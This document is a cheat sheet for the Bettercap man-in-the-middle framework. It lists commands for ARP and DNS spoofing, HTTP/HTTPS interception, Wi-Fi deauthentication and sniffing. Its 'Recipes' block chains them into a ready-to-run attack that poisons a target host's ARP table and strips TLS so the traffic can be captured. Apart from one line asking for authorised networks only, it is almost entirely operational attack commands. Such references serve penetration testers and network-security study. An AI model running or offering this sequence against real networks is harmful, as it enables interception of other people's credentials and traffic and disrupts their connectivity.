# Bettercap Cheat Sheet
> MITM / network attack framework · Network · `apt install bettercap`

---

## Quick start
```bash
sudo bettercap -iface eth0
```

## Core modules
| Command | Purpose |
|---|---|
| `net.probe on` | discover hosts on the LAN |
| `net.show` | list discovered hosts |
| `arp.spoof on` | ARP-poison the LAN (set `arp.spoof.targets` first) |
| `set arp.spoof.targets 10.0.0.5` | scope the spoof to one host |
| `net.sniff on` | passive sniffing |
| `http.proxy on` / `https.proxy on` | intercept HTTP/HTTPS |
| `dns.spoof on` | DNS spoofing (configure `dns.spoof.domains`) |
| `wifi.recon on` | wireless AP/client discovery |
| `wifi.deauth <BSSID>` | deauth clients from an AP |
| `hid.recon on` | wireless HID (keyboard/mouse dongle) recon |

## Caplets
```bash
bettercap -iface eth0 -caplet http-req-dump
bettercap -iface eth0 -caplet hstshijack/hstshijack
```
Caplets are `.cap` scripts of commands — write your own to chain modules.

## Recipes
```
net.probe on
set arp.spoof.targets 10.0.0.5
arp.spoof on
set http.proxy.sslstrip true
http.proxy on
net.sniff on
```

## Gotchas / OPSEC
- Authorized networks only — ARP spoofing/DNS spoofing disrupts traffic for real users.
- Always `arp.spoof off` and `net.recon off` before quitting to restore normal ARP tables.

## See also
- https://www.bettercap.org/
- `qyvora/toha3ee.md` (overlapping mitm module set, same console philosophy)
